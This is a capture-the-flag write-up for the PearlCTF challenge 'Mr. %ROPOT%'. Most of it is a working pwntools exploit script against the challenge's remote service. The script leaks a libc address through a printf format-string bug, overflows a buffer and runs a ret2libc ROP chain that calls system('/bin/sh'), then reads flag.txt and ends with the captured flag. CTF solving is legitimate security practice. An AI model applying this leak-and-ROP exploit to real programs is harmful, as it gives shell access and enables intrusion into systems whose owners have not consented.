# Mr. %ROPOT%

>Would you like some joke or fact? Don't forget to leave a review!

https://pearlctf.in/files/mrropot.zip

nc mr---ropot.ctf.pearlctf.in 30009


## solve
```
from pwn import *

elf = ELF("./chall_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)
p = remote("mr---ropot.ctf.pearlctf.in", 30009)

p.sendlineafter(b"Exit\n", b"1")
p.sendlineafter(b"Leave a response: \n", b"%17$p")
p.readuntil(b"Your Response:\n")
leak = int(p.readline().decode(), 16)
libc.address = leak - 0x2a1ca

p.sendline(b"2")
p.readuntil(b"Leave a response: \n")

rop = ROP(libc)
rop.raw(b"A" * 0x38)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.sendline(rop.chain())

p.readuntil(b"recorded.\n")
p.sendline(b"/bin/cat flag.txt")
print(p.readuntil(b"}").decode())
```

## flag
`pearl{fin4lly_g0t_my_fl4g_th4nks_printf}`